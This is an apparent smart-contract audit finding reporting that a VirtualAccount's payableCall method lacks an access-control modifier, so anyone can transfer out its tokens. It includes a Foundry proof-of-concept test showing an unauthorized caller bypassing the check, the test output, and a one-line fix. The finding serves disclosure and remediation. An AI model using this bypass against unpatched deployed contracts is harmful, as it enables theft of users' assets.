[H-01] All tokens can be stolen fromVirtualAccountdue to missing access modifier
Submitted by0xTheC0der, also found byMIQUINHO,minhtrng,QiuhaoLi,btk,Noro,imare,josephdara,Limbooo,alexweb3,ast3ros,0xTiwa,tank,unsafesol,windhustler,NoTechBG,alexxander,its_basu, 0xblackskull (1,2),zzzitron,gztttt,Inspecktor,bin2chen,mert_eren,ether_sky,John_Femi,joaovwfreire,MrPotatoMagic,Jorgect,ciphermarco,Yanchuan,Vagner,nobody2018,0xRstStn,pfapostol,Kek,0xDING99YA,klau5,blutorque,hals,ladboy233, 0xfuje (1,2),Pessimistic,marqymarq10,oada,peakbolt,3docSec,stuxy,kodyvim,Viktor_Cortess,n1punp,Aamir,SovaSlava,Kow,zambody,TangYuanShen,_eperezok,ayden,ustas,rvierdiiev,Black_Box_DD,HChang26,Hama,gumgumzum,KingNFT,0x180db,SpicyMeatball,0xWaitress,T1MOH,orion,perseverancesuccess, andperitoflores
All non-native assets (ERC20 tokens, NFTs, etc.) can be stolen by anyone from aVirtualAccountusing itspayableCall(...)method, which lacks the necessary access control modifierrequiresApprovedCaller. See also, thecall(…)method which utilizes therequiresApprovedCallermodifier.
Therefore, an attacker can craft a call to e.g.ERC20.transfer(...)on behalf of the contract, like thewithdrawERC20(…)method does, while bypassing access control by executing the call viapayableCall(...).
As a consequence, all non-native assets of theVirtualAccountcan be stolen by anyone causing a loss for its owner.
Proof of Concept
Add the code below as a new test filetest/ulysses-omnichain/VirtualAccount.t.soland run it usingforge test -vv --match-contract VirtualAccountTestin order to verify the above claims:
//SPDX-License-Identifier: AGPL-3.0-onlypragmasolidity^0.8.0;import{VirtualAccount}from"@omni/VirtualAccount.sol";import{PayableCall}from"@omni/interfaces/IVirtualAccount.sol";import{ERC20}from"solmate/tokens/ERC20.sol";import"./helpers/ImportHelper.sol";contractVirtualAccountTestisTest{addresspublicalice;addresspublicbob;VirtualAccountpublicvAcc;functionsetUp()public{alice=makeAddr("Alice");bob=makeAddr("Bob");// create new VirtualAccount for user Alice and this test contract as mock local portvAcc=newVirtualAccount(alice,address(this));}functiontestWithdrawERC20_AliceSuccess()public{vm.prank(alice);vAcc.withdrawERC20(address(this),1);// caller is authorized}functiontestWithdrawERC20_BobFailure()public{vm.prank(bob);vm.expectRevert();vAcc.withdrawERC20(address(this),1);// caller is not authorized}functiontestWithdrawERC20_BobBypassSuccess()public{PayableCall[]memorycalls=newPayableCall[](1);calls[0].target=address(this);calls[0].callData=abi.encodeCall(ERC20.transfer, (bob,1));vm.prank(bob);vAcc.payableCall(calls);// caller is not authorized but it does't matter}// mock VirtualAccount call to local portfunctionisRouterApproved(VirtualAccount_userAccount,address_router)externalreturns(bool) {returnfalse;}// mock ERC20 token transferfunctiontransfer(addressto,uint256value)externalreturns(bool) {console2.log("Transferred %s from %s to %s",value,msg.sender,to);returntrue;}}
Output:
Running 3 tests for test/ulysses-omnichain/VirtualAccount.t.sol:VirtualAccountTest[PASS] testWithdrawERC20_AliceSuccess() (gas: 15428)Logs:Transferred 1 from 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f to 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea[PASS] testWithdrawERC20_BobBypassSuccess() (gas: 18727)Logs:Transferred 1 from 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f to 0x4dBa461cA9342F4A6Cf942aBd7eacf8AE259108C[PASS] testWithdrawERC20_BobFailure() (gas: 12040)Test result: ok. 3 passed; 0 failed; 0 skipped; finished in 1.11ms
Recommended Mitigation Steps
Add the missingrequiresApprovedCallermodifier to thepayableCall(...)method:
diff --git a/src/VirtualAccount.sol b/src/VirtualAccount.solindex f6a9134..49a679a 100644--- a/src/VirtualAccount.sol+++ b/src/VirtualAccount.sol@@ -82,7 +82,7 @@ contract VirtualAccount is IVirtualAccount, ERC1155Receiver {}/// @inheritdoc IVirtualAccount-    function payableCall(PayableCall[] calldata calls) public payable returns (bytes[] memory returnData) {+    function payableCall(PayableCall[] calldata calls) public payable requiresApprovedCaller returns (bytes[] memory returnData) {uint256 valAccumulator;uint256 length = calls.length;returnData = new bytes[](length);
Assessed type
Access Control
0xLightt (Maia) confirmed
0xBugsy (Maia) commented:
Issue addressedhere.